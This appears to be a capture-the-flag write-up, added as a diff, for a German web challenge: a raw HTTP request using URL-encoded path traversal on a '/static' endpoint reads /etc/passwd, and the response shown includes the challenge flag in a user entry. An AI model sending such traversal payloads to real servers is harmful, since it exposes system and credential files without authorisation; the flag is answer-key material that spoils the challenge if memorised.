@@ -1,0 +1,54 @@
+Hier musst du einen Klassiker unter den Web-Schwachstellen ausnutzen. Das Motto der Bank ist: Anleger Gründer Bänker - alle lügen!
+
+
+https://000990aa23-web-upupair.dbhchallenge.net/
+
+
+GET /static?..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Host: 000990aa23-web-upupair.dbhchallenge.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://000990aa23-web-upupair.dbhchallenge.net/agb
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+HTTP/1.1 200 OK
+Server: nginx/1.21.6
+Date: Wed, 10 Aug 2022 12:21:01 GMT
+Content-Type: application/octet-stream
+Content-Length: 1002
+Connection: close
+X-Powered-By: PHP/7.4.30
+Content-Description: File Transfer
+Content-Disposition: attachment; filename="passwd"
+Expires: 0
+Cache-Control: must-revalidate
+Pragma: public
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+dbh:x:1000:1000:DBH{dee293c3d4b666030f0e50c2d8d38e2ce2b14837}:/home/dbh:/bin/sh
